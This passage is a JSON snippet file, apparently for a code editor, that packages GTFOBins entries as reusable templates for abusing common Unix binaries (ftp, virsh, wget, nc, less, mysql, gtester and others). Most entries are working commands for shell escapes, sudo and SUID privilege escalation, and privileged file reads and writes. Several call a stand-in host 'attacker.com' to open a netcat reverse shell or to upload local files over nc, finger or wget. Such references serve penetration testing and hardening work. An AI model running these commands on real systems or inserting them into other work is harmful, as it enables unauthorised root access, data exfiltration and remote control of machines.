            "RHOST=${1:attacker.com}",
            "ftp \\$RHOST",
            "get file_to_get${0}",
            "```"
        ],
        "description": "abuse ftp with file-download - Fetch a remote file from a FTP server."
    },
    "ftp sudo (gtfobins)": {
        "prefix": "ftp sudo",
        "body": [
            "abuse ftp with sudo",
            "",
            "```sh",
            "sudo ftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse ftp with sudo"
    },
    "virsh sudo (gtfobins)": {
        "prefix": "virsh sudo",
        "body": [
            "abuse virsh with sudo",
            "",
            "```sh",
            "SCRIPT=script_to_run",
            "TF=\\$(mktemp)",
            "cat > \\$TF << EOF",
            "<domain type='kvm'>",
            "  <name>x</name>",
            "  <os>",
            "    <type arch='x86_64'>hvm</type>",
            "  </os>",
            "  <memory unit='KiB'>1</memory>",
            "  <devices>",
            "    <interface type='ethernet'>",
            "      <script path='\\$SCRIPT'/>",
            "    </interface>",
            "  </devices>",
            "</domain>",
            "EOF",
            "sudo virsh -c qemu:///system create \\$TF",
            "virsh -c qemu:///system destroy x${0}",
            "```"
        ],
        "description": "abuse virsh with sudo"
    },
    "virsh file-write (gtfobins)": {
        "prefix": "virsh file-write",
        "body": [
            "abuse virsh with file-write, This requires the user to be in the `libvirt` group to perform privileged file write. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML.",
            "",
            "```sh",
            "LFILE_DIR=/root",
            "LFILE_NAME=${1:file_to_write}",
            "echo 'data' > data_to_write",
            "TF=\\$(mktemp)",
            "cat > \\$TF <<EOF",
            "<volume type='file'>",
            "  <name>y</name>",
            "  <key>\\$LFILE_DIR/\\$LFILE_NAME</key>",
            "  <source>",
            "  </source>",
            "  <capacity unit='bytes'>5</capacity>",
            "  <allocation unit='bytes'>4096</allocation>",
            "  <physical unit='bytes'>5</physical>",
            "  <target>",
            "    <path>\\$LFILE_DIR/\\$LFILE_NAME</path>",
            "    <format type='raw'/>",
            "    <permissions>",
            "      <mode>0600</mode>",
            "      <owner>0</owner>",
            "      <group>0</group>",
            "    </permissions>",
            "  </target>",
            "</volume>",
            "EOF",
            "virsh -c qemu:///system pool-create-as x dir --target \\$LFILE_DIR",
            "virsh -c qemu:///system vol-create --pool x --file \\$TF",
            "virsh -c qemu:///system vol-upload --pool x \\$LFILE_DIR/\\$LFILE_NAME data_to_write",
            "virsh -c qemu:///system pool-destroy x${0}",
            "```"
        ],
        "description": "abuse virsh with file-write - This requires the user to be in the `libvirt` group to perform privileged file write. If the target directory doesn't exist, `pool-create-as` must be run with the `--build` option. The destination file ownership and permissions can be set in the XML."
    },
    "virsh file-read (gtfobins)": {
        "prefix": "virsh file-read",
        "body": [
            "abuse virsh with file-read, This requires the user to be in the `libvirt` group to perform privileged file read.",
            "",
            "```sh",
            "LFILE_DIR=/root",
            "LFILE_NAME=${1:file_to_read}",
            "SPATH=${2:file_to_save}",
            "virsh -c qemu:///system pool-create-as x dir --target \\$LFILE_DIR",
            "virsh -c qemu:///system vol-download --pool x \\$LFILE_NAME \\$SPATH",
            "virsh -c qemu:///system pool-destroy x${0}",
            "```"
        ],
        "description": "abuse virsh with file-read - This requires the user to be in the `libvirt` group to perform privileged file read."
    },
    "date file-read (gtfobins)": {
        "prefix": "date file-read",
        "body": [
            "abuse date with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "date -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse date with file-read"
    },
    "date suid (gtfobins)": {
        "prefix": "date suid",
        "body": [
            "abuse date with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./date -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse date with suid"
    },
    "date sudo (gtfobins)": {
        "prefix": "date sudo",
        "body": [
            "abuse date with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo date -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse date with sudo"
    },
    "mosquitto file-read (gtfobins)": {
        "prefix": "mosquitto file-read",
        "body": [
            "abuse mosquitto with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "mosquitto -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mosquitto with file-read"
    },
    "mosquitto suid (gtfobins)": {
        "prefix": "mosquitto suid",
        "body": [
            "abuse mosquitto with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./mosquitto -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mosquitto with suid"
    },
    "mosquitto sudo (gtfobins)": {
        "prefix": "mosquitto sudo",
        "body": [
            "abuse mosquitto with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo mosquitto -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse mosquitto with sudo"
    },
    "opkg sudo (gtfobins)": {
        "prefix": "opkg sudo",
        "body": [
            "abuse opkg with sudo, \nIt runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'exec /bin/sh' > $TF/x.sh\n\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n\n```\n",
            "",
            "```sh",
            "sudo opkg install x_1.0_all.deb${0}",
            "```"
        ],
        "description": "abuse opkg with sudo - \nIt runs an interactive shell using a specially crafted Debian package. Generate it with [fpm](https://github.com/jordansissel/fpm) and upload it to the target.\n\n```\n\nTF=$(mktemp -d)\n\necho 'exec /bin/sh' > $TF/x.sh\n\nfpm -n x -s dir -t deb -a all --before-install $TF/x.sh $TF\n\n```\n"
    },
    "tac file-read (gtfobins)": {
        "prefix": "tac file-read",
        "body": [
            "abuse tac with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "tac -s 'RANDOM' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tac with file-read"
    },
    "tac suid (gtfobins)": {
        "prefix": "tac suid",
        "body": [
            "abuse tac with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./tac -s 'RANDOM' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tac with suid"
    },
    "tac sudo (gtfobins)": {
        "prefix": "tac sudo",
        "body": [
            "abuse tac with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo tac -s 'RANDOM' \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse tac with sudo"
    },
    "wget shell (gtfobins)": {
        "prefix": "wget shell",
        "body": [
            "abuse wget with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "chmod +x \\$TF",
            "echo -e '#!/bin/sh\\n/bin/sh 1>&0' >\\$TF",
            "wget --use-askpass=\\$TF 0${0}",
            "```"
        ],
        "description": "abuse wget with shell"
    },
    "wget file-upload (gtfobins)": {
        "prefix": "wget file-upload",
        "body": [
            "abuse wget with file-upload, Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/",
            "LFILE=${1:file_to_send}",
            "wget --post-file=\\$LFILE \\$URL${0}",
            "```"
        ],
        "description": "abuse wget with file-upload - Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use `--post-data` to send hard-coded data."
    },
    "wget file-read (gtfobins)": {
        "prefix": "wget file-read",
        "body": [
            "abuse wget with file-read, The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "wget -i \\$LFILE${0}",
            "```"
        ],
        "description": "abuse wget with file-read - The file to be read is treated as a list of URLs, one per line, which are actually fetched by `wget`. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data."
    },
    "wget file-write (gtfobins)": {
        "prefix": "wget file-write",
        "body": [
            "abuse wget with file-write, The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "TF=\\$(mktemp)",
            "echo DATA > \\$TF",
            "wget -i \\$TF -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse wget with file-write - The data to be written is treated as a list of URLs, one per line, which are actually fetched by `wget`. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data."
    },
    "wget file-download (gtfobins)": {
        "prefix": "wget file-download",
        "body": [
            "abuse wget with file-download, Fetch a remote file via HTTP GET request.",
            "",
            "```sh",
            "URL=http://${2:attacker.com}/file_to_get",
            "LFILE=${1:file_to_save}",
            "wget \\$URL -O \\$LFILE${0}",
            "```"
        ],
        "description": "abuse wget with file-download - Fetch a remote file via HTTP GET request."
    },
    "wget suid (gtfobins)": {
        "prefix": "wget suid",
        "body": [
            "abuse wget with suid",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "chmod +x \\$TF",
            "echo -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >\\$TF",
            "./wget --use-askpass=\\$TF 0${0}",
            "```"
        ],
        "description": "abuse wget with suid"
    },
    "wget sudo (gtfobins)": {
        "prefix": "wget sudo",
        "body": [
            "abuse wget with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "chmod +x \\$TF",
            "echo -e '#!/bin/sh\\n/bin/sh 1>&0' >\\$TF",
            "sudo wget --use-askpass=\\$TF 0${0}",
            "```"
        ],
        "description": "abuse wget with sudo"
    },
    "run-mailcap shell (gtfobins)": {
        "prefix": "run-mailcap shell",
        "body": [
            "abuse run-mailcap with shell, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "run-mailcap --action=view /etc/hosts",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse run-mailcap with shell - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "run-mailcap file-read (gtfobins)": {
        "prefix": "run-mailcap file-read",
        "body": [
            "abuse run-mailcap with file-read, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "run-mailcap --action=view ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse run-mailcap with file-read - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "run-mailcap file-write (gtfobins)": {
        "prefix": "run-mailcap file-write",
        "body": [
            "abuse run-mailcap with file-write, \nThe file must exist and be not empty.\n\n\n\nThis invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.\n",
            "",
            "```sh",
            "run-mailcap --action=edit ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse run-mailcap with file-write - \nThe file must exist and be not empty.\n\n\n\nThis invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.\n"
    },
    "run-mailcap sudo (gtfobins)": {
        "prefix": "run-mailcap sudo",
        "body": [
            "abuse run-mailcap with sudo, This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.",
            "",
            "```sh",
            "sudo run-mailcap --action=view /etc/hosts",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse run-mailcap with sudo - This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply."
    },
    "start-stop-daemon shell (gtfobins)": {
        "prefix": "start-stop-daemon shell",
        "body": [
            "abuse start-stop-daemon with shell",
            "",
            "```sh",
            "start-stop-daemon -n \\$RANDOM -S -x /bin/sh${0}",
            "```"
        ],
        "description": "abuse start-stop-daemon with shell"
    },
    "start-stop-daemon suid (gtfobins)": {
        "prefix": "start-stop-daemon suid",
        "body": [
            "abuse start-stop-daemon with suid",
            "",
            "```sh",
            "./start-stop-daemon -n \\$RANDOM -S -x /bin/sh -- -p${0}",
            "```"
        ],
        "description": "abuse start-stop-daemon with suid"
    },
    "start-stop-daemon sudo (gtfobins)": {
        "prefix": "start-stop-daemon sudo",
        "body": [
            "abuse start-stop-daemon with sudo",
            "",
            "```sh",
            "sudo start-stop-daemon -n \\$RANDOM -S -x /bin/sh${0}",
            "```"
        ],
        "description": "abuse start-stop-daemon with sudo"
    },
    "finger file-upload (gtfobins)": {
        "prefix": "finger file-upload",
        "body": [
            "abuse finger with file-upload, Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "LFILE=${1:file_to_send}",
            "finger \"\\$(base64 \\$LFILE)@\\$RHOST\"${0}",
            "```"
        ],
        "description": "abuse finger with file-upload - Send a binary file to a TCP port. Run `sudo nc -l -p 79 | base64 -d > \"file_to_save\"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments."
    },
    "finger file-download (gtfobins)": {
        "prefix": "finger file-download",
        "body": [
            "abuse finger with file-download, Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | sudo nc -l -p 79` on the attacker box to send the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "LFILE=${1:file_to_save}",
            "finger x@\\$RHOST | base64 -d > \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse finger with file-download - Fetch remote binary file from a remote TCP port. Run `base64 \"file_to_send\" | sudo nc -l -p 79` on the attacker box to send the file."
    },
    "psftp shell (gtfobins)": {
        "prefix": "psftp shell",
        "body": [
            "abuse psftp with shell",
            "",
            "```sh",
            "psftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse psftp with shell"
    },
    "psftp limited-suid (gtfobins)": {
        "prefix": "psftp limited-suid",
        "body": [
            "abuse psftp with limited-suid",
            "",
            "```sh",
            "sudo psftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse psftp with limited-suid"
    },
    "psftp sudo (gtfobins)": {
        "prefix": "psftp sudo",
        "body": [
            "abuse psftp with sudo",
            "",
            "```sh",
            "sudo psftp",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse psftp with sudo"
    },
    "mysql shell (gtfobins)": {
        "prefix": "mysql shell",
        "body": [
            "abuse mysql with shell",
            "",
            "```sh",
            "mysql -e '\\! /bin/sh'${0}",
            "```"
        ],
        "description": "abuse mysql with shell"
    },
    "mysql sudo (gtfobins)": {
        "prefix": "mysql sudo",
        "body": [
            "abuse mysql with sudo",
            "",
            "```sh",
            "sudo mysql -e '\\! /bin/sh'${0}",
            "```"
        ],
        "description": "abuse mysql with sudo"
    },
    "mysql limited-suid (gtfobins)": {
        "prefix": "mysql limited-suid",
        "body": [
            "abuse mysql with limited-suid",
            "",
            "```sh",
            "./mysql -e '\\! /bin/sh'${0}",
            "```"
        ],
        "description": "abuse mysql with limited-suid"
    },
    "mysql library-load (gtfobins)": {
        "prefix": "mysql library-load",
        "body": [
            "abuse mysql with library-load, \nA MySQL server must accept connections in order for this to work.\n\n\n\nThe following loads the `/path/to/lib.so` shared object.\n",
            "",
            "```sh",
            "mysql --default-auth ../../../../../path/to/lib${0}",
            "```"
        ],
        "description": "abuse mysql with library-load - \nA MySQL server must accept connections in order for this to work.\n\n\n\nThe following loads the `/path/to/lib.so` shared object.\n"
    },
    "fping file-read (gtfobins)": {
        "prefix": "fping file-read",
        "body": [
            "abuse fping with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "fping -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse fping with file-read"
    },
    "fping sudo (gtfobins)": {
        "prefix": "fping sudo",
        "body": [
            "abuse fping with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo fping -f \\$LFILE${0}",
            "```"
        ],
        "description": "abuse fping with sudo"
    },
    "whiptail file-read (gtfobins)": {
        "prefix": "whiptail file-read",
        "body": [
            "abuse whiptail with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "whiptail --textbox --scrolltext \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse whiptail with file-read"
    },
    "whiptail suid (gtfobins)": {
        "prefix": "whiptail suid",
        "body": [
            "abuse whiptail with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./whiptail --textbox --scrolltext \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse whiptail with suid"
    },
    "whiptail sudo (gtfobins)": {
        "prefix": "whiptail sudo",
        "body": [
            "abuse whiptail with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo whiptail --textbox --scrolltext \"\\$LFILE\" 0 0${0}",
            "```"
        ],
        "description": "abuse whiptail with sudo"
    },
    "gcore file-read (gtfobins)": {
        "prefix": "gcore file-read",
        "body": [
            "abuse gcore with file-read",
            "",
            "```sh",
            "gcore \\$PID${0}",
            "```"
        ],
        "description": "abuse gcore with file-read"
    },
    "gcore sudo (gtfobins)": {
        "prefix": "gcore sudo",
        "body": [
            "abuse gcore with sudo",
            "",
            "```sh",
            "sudo gcore \\$PID${0}",
            "```"
        ],
        "description": "abuse gcore with sudo"
    },
    "gcore suid (gtfobins)": {
        "prefix": "gcore suid",
        "body": [
            "abuse gcore with suid",
            "",
            "```sh",
            "./gcore \\$PID${0}",
            "```"
        ],
        "description": "abuse gcore with suid"
    },
    "check_ssl_cert command (gtfobins)": {
        "prefix": "check_ssl_cert command",
        "body": [
            "abuse check_ssl_cert with command, The host example.net must return a certificate via TLS",
            "",
            "```sh",
            "COMMAND=id",
            "OUTPUT=output_file",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND | tee \\$OUTPUT\" > \\$TF",
            "chmod +x \\$TF",
            "check_ssl_cert --curl-bin \\$TF -H example.net",
            "cat \\$OUTPUT${0}",
            "```"
        ],
        "description": "abuse check_ssl_cert with command - The host example.net must return a certificate via TLS"
    },
    "check_ssl_cert sudo (gtfobins)": {
        "prefix": "check_ssl_cert sudo",
        "body": [
            "abuse check_ssl_cert with sudo, The host example.net must return a certificate via TLS",
            "",
            "```sh",
            "COMMAND=id",
            "OUTPUT=output_file",
            "TF=\\$(mktemp)",
            "echo \"\\$COMMAND | tee \\$OUTPUT\" > \\$TF",
            "chmod +x \\$TF",
            "umask 022",
            "check_ssl_cert --curl-bin \\$TF -H example.net",
            "cat \\$OUTPUT${0}",
            "```"
        ],
        "description": "abuse check_ssl_cert with sudo - The host example.net must return a certificate via TLS"
    },
    "aspell file-read (gtfobins)": {
        "prefix": "aspell file-read",
        "body": [
            "abuse aspell with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "aspell -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse aspell with file-read"
    },
    "aspell suid (gtfobins)": {
        "prefix": "aspell suid",
        "body": [
            "abuse aspell with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./aspell -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse aspell with suid"
    },
    "aspell sudo (gtfobins)": {
        "prefix": "aspell sudo",
        "body": [
            "abuse aspell with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo aspell -c \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse aspell with sudo"
    },
    "torify shell (gtfobins)": {
        "prefix": "torify shell",
        "body": [
            "abuse torify with shell",
            "",
            "```sh",
            "torify /bin/sh${0}",
            "```"
        ],
        "description": "abuse torify with shell"
    },
    "torify sudo (gtfobins)": {
        "prefix": "torify sudo",
        "body": [
            "abuse torify with sudo",
            "",
            "```sh",
            "sudo torify /bin/sh${0}",
            "```"
        ],
        "description": "abuse torify with sudo"
    },
    "kubectl file-upload (gtfobins)": {
        "prefix": "kubectl file-upload",
        "body": [
            "abuse kubectl with file-upload",
            "",
            "```sh",
            "LFILE=dir_to_serve",
            "kubectl proxy --address=0.0.0.0 --port=4444 --www=\\$LFILE --www-prefix=/x/${0}",
            "```"
        ],
        "description": "abuse kubectl with file-upload"
    },
    "kubectl suid (gtfobins)": {
        "prefix": "kubectl suid",
        "body": [
            "abuse kubectl with suid",
            "",
            "```sh",
            "LFILE=dir_to_serve",
            "./kubectl proxy --address=0.0.0.0 --port=4444 --www=\\$LFILE --www-prefix=/x/${0}",
            "```"
        ],
        "description": "abuse kubectl with suid"
    },
    "kubectl sudo (gtfobins)": {
        "prefix": "kubectl sudo",
        "body": [
            "abuse kubectl with sudo",
            "",
            "```sh",
            "LFILE=dir_to_serve",
            "sudo kubectl proxy --address=0.0.0.0 --port=4444 --www=\\$LFILE --www-prefix=/x/${0}",
            "```"
        ],
        "description": "abuse kubectl with sudo"
    },
    "column file-read (gtfobins)": {
        "prefix": "column file-read",
        "body": [
            "abuse column with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "column \\$LFILE${0}",
            "```"
        ],
        "description": "abuse column with file-read"
    },
    "column suid (gtfobins)": {
        "prefix": "column suid",
        "body": [
            "abuse column with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./column \\$LFILE${0}",
            "```"
        ],
        "description": "abuse column with suid"
    },
    "column sudo (gtfobins)": {
        "prefix": "column sudo",
        "body": [
            "abuse column with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo column \\$LFILE${0}",
            "```"
        ],
        "description": "abuse column with sudo"
    },
    "pkexec sudo (gtfobins)": {
        "prefix": "pkexec sudo",
        "body": [
            "abuse pkexec with sudo",
            "",
            "```sh",
            "sudo pkexec /bin/sh${0}",
            "```"
        ],
        "description": "abuse pkexec with sudo"
    },
    "apache2ctl file-read (gtfobins)": {
        "prefix": "apache2ctl file-read",
        "body": [
            "abuse apache2ctl with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "apache2ctl -c \"Include \\$LFILE\" -k stop${0}",
            "```"
        ],
        "description": "abuse apache2ctl with file-read"
    },
    "apache2ctl sudo (gtfobins)": {
        "prefix": "apache2ctl sudo",
        "body": [
            "abuse apache2ctl with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo apache2ctl -c \"Include \\$LFILE\" -k stop${0}",
            "```"
        ],
        "description": "abuse apache2ctl with sudo"
    },
    "nc reverse-shell (gtfobins)": {
        "prefix": "nc reverse-shell",
        "body": [
            "abuse nc with reverse-shell, Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "nc -e /bin/sh \\$RHOST \\$RPORT${0}",
            "```"
        ],
        "description": "abuse nc with reverse-shell - Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional."
    },
    "nc bind-shell (gtfobins)": {
        "prefix": "nc bind-shell",
        "body": [
            "abuse nc with bind-shell, Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional.",
            "",
            "```sh",
            "LPORT=${1:12345}",
            "nc -l -p \\$LPORT -e /bin/sh${0}",
            "```"
        ],
        "description": "abuse nc with bind-shell - Run `nc target.com 12345` on the attacker box to connect to the shell. This only works with netcat traditional."
    },
    "nc file-upload (gtfobins)": {
        "prefix": "nc file-upload",
        "body": [
            "abuse nc with file-upload, Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file.",
            "",
            "```sh",
            "RHOST=${2:attacker.com}",
            "RPORT=${3:12345}",
            "LFILE=${1:file_to_send}",
            "nc \\$RHOST \\$RPORT < \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nc with file-upload - Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file."
    },
    "nc file-download (gtfobins)": {
        "prefix": "nc file-download",
        "body": [
            "abuse nc with file-download, Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file.",
            "",
            "```sh",
            "LPORT=${2:12345}",
            "LFILE=${1:file_to_save}",
            "nc -l -p \\$LPORT > \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse nc with file-download - Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file."
    },
    "nc sudo (gtfobins)": {
        "prefix": "nc sudo",
        "body": [
            "abuse nc with sudo, Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "sudo nc -e /bin/sh \\$RHOST \\$RPORT${0}",
            "```"
        ],
        "description": "abuse nc with sudo - Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional."
    },
    "nc limited-suid (gtfobins)": {
        "prefix": "nc limited-suid",
        "body": [
            "abuse nc with limited-suid, Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional.",
            "",
            "```sh",
            "RHOST=${1:attacker.com}",
            "RPORT=${2:12345}",
            "./nc -e /bin/sh \\$RHOST \\$RPORT${0}",
            "```"
        ],
        "description": "abuse nc with limited-suid - Run `nc -l -p 12345` on the attacker box to receive the shell. This only works with netcat traditional."
    },
    "lftp shell (gtfobins)": {
        "prefix": "lftp shell",
        "body": [
            "abuse lftp with shell",
            "",
            "```sh",
            "lftp -c '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse lftp with shell"
    },
    "lftp limited-suid (gtfobins)": {
        "prefix": "lftp limited-suid",
        "body": [
            "abuse lftp with limited-suid",
            "",
            "```sh",
            "./lftp -c '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse lftp with limited-suid"
    },
    "lftp sudo (gtfobins)": {
        "prefix": "lftp sudo",
        "body": [
            "abuse lftp with sudo",
            "",
            "```sh",
            "sudo lftp -c '!/bin/sh'${0}",
            "```"
        ],
        "description": "abuse lftp with sudo"
    },
    "gtester file-write (gtfobins)": {
        "prefix": "gtester file-write",
        "body": [
            "abuse gtester with file-write, Data to be written appears in an XML attribute in the output file (`<testbinary path=\"DATA\">`).",
            "",
            "```sh",
            "LFILE=${1:file_to_write}",
            "gtester \"DATA\" -o \\$LFILE${0}",
            "```"
        ],
        "description": "abuse gtester with file-write - Data to be written appears in an XML attribute in the output file (`<testbinary path=\"DATA\">`)."
    },
    "gtester shell (gtfobins)": {
        "prefix": "gtester shell",
        "body": [
            "abuse gtester with shell",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '#!/bin/sh' > \\$TF",
            "echo 'exec /bin/sh -p 0<&1' >> \\$TF",
            "chmod +x \\$TF",
            "gtester -q \\$TF${0}",
            "```"
        ],
        "description": "abuse gtester with shell"
    },
    "gtester sudo (gtfobins)": {
        "prefix": "gtester sudo",
        "body": [
            "abuse gtester with sudo",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '#!/bin/sh' > \\$TF",
            "echo 'exec /bin/sh 0<&1' >> \\$TF",
            "chmod +x \\$TF",
            "sudo gtester -q \\$TF${0}",
            "```"
        ],
        "description": "abuse gtester with sudo"
    },
    "gtester suid (gtfobins)": {
        "prefix": "gtester suid",
        "body": [
            "abuse gtester with suid",
            "",
            "```sh",
            "TF=\\$(mktemp)",
            "echo '#!/bin/sh -p' > \\$TF",
            "echo 'exec /bin/sh -p 0<&1' >> \\$TF",
            "chmod +x \\$TF",
            "sudo gtester -q \\$TF${0}",
            "```"
        ],
        "description": "abuse gtester with suid"
    },
    "fold file-read (gtfobins)": {
        "prefix": "fold file-read",
        "body": [
            "abuse fold with file-read",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "fold -w99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fold with file-read"
    },
    "fold suid (gtfobins)": {
        "prefix": "fold suid",
        "body": [
            "abuse fold with suid",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "./fold -w99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fold with suid"
    },
    "fold sudo (gtfobins)": {
        "prefix": "fold sudo",
        "body": [
            "abuse fold with sudo",
            "",
            "```sh",
            "LFILE=${1:file_to_read}",
            "sudo fold -w99999999 \"\\$LFILE\"${0}",
            "```"
        ],
        "description": "abuse fold with sudo"
    },
    "less shell (gtfobins)": {
        "prefix": "less shell",
        "body": [
            "abuse less with shell",
            "",
            "```sh",
            "less /etc/profile",
            "v:shell${0}",
            "```"
        ],
        "description": "abuse less with shell"
    },
    "less file-read (gtfobins)": {
        "prefix": "less file-read",
        "body": [
            "abuse less with file-read, This is useful when `less` is used as a pager by another binary to read a different file.",
            "",
            "```sh",
            "less /etc/profile",
            ":e ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse less with file-read - This is useful when `less` is used as a pager by another binary to read a different file."
    },
    "less file-write (gtfobins)": {
        "prefix": "less file-write",
        "body": [
            "abuse less with file-write, This invokes the default editor to edit the file. The file must exist.",
            "",
            "```sh",
            "less ${1:file_to_write}",
            "v${0}",
            "```"
        ],
        "description": "abuse less with file-write - This invokes the default editor to edit the file. The file must exist."
    },
    "less sudo (gtfobins)": {
        "prefix": "less sudo",
        "body": [
            "abuse less with sudo",
            "",
            "```sh",
            "sudo less /etc/profile",
            "!/bin/sh${0}",
            "```"
        ],
        "description": "abuse less with sudo"
    },
    "less suid (gtfobins)": {
        "prefix": "less suid",
        "body": [
            "abuse less with suid",
            "",
            "```sh",
            "./less ${1:file_to_read}${0}",
            "```"
        ],
        "description": "abuse less with suid"
    },
    "jrunscript shell (gtfobins)": {
        "prefix": "jrunscript shell",
        "body": [
            "abuse jrunscript with shell",
            "",
            "```sh",
            "jrunscript -e \"exec('/bin/sh -c \\\\$@|sh _ echo sh <\\$(tty) >\\$(tty) 2>\\$(tty)')\"${0}",
            "```"
        ],
        "description": "abuse jrunscript with shell"
    },
    "jrunscript reverse-shell (gtfobins)": {
